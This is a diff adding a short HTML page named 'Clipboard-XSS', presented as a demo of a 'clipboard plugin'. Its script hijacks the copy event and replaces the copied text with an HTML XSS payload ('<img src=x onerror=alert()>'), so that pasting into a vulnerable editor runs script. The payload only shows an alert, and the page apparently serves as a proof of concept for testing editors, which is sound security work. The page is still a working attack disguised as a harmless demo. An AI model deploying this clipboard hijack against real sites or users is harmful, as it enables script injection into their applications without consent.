@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clipboard-XSS</title>
+</head>
+<body>
+    <h3>Try out our new clipboard plugin</h3>
+    <p>Copy <strong>reddit</strong>, paste it on the editor and see what happens!</p>
+    <script>
+        document.oncopy = event => {
+            event.preventDefault();
+            event.clipboardData.setData('text/html', '<img src=x onerror=alert()>');
+            console.log("updated clipboard");
+        }
+    </script>
+</body>
+</html>
